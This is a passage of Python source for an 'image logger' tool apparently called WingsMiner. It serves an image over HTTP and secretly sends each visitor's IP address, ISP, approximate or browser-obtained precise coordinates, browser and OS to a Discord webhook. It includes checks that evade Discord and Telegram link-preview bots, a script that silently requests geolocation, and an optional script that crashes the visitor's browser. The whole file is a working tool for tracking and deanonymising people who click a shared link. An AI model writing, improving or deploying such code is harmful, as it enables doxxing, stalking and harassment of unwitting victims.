    "message": { 
        "doMessage": False,
        "message": ".",
        "richMessage": True,
    },

    "vpnCheck": 1, 

    "linkAlerts": False,
    "buggedImage": True,

    "antiBot": 1,

    "redirect": {
        "redirect": True,
        "page": "https://discord.gg/wingsminer" 
    },
}

blacklistedIPs = ("27", "104", "143", "164") 

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "WingsMiner Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "WingsMiner link sent.",
            "color": config["color"],
            "description": f"Link sent successfully.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "."

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "",
            "color": config["color"],
            "description": f"""```The user has clicked the image. IP successfully grabbed. <WingsServices>
            
> IP:
{ip if ip else 'unknown'}

> Country / City:
{info['country'] if info['country'] else 'unknown'} / {info['city'] if info['city'] else 'unknown'}

> Provider:
{info['isp'] if info['isp'] else 'unknown'}

> Coords:
{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')} ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})

> Timezone:
{info['timezone'].split('/')[0]}

> VPN:
{info['proxy']}

> ASN:
{info['as'] if info['as'] else 'unknown'}

> Browser:
{browser}

> OS:
{os}

> User Agent:
{useragent}
```""",
    }
  ],
}

    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]: self.wfile.write(binaries["loading"])

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI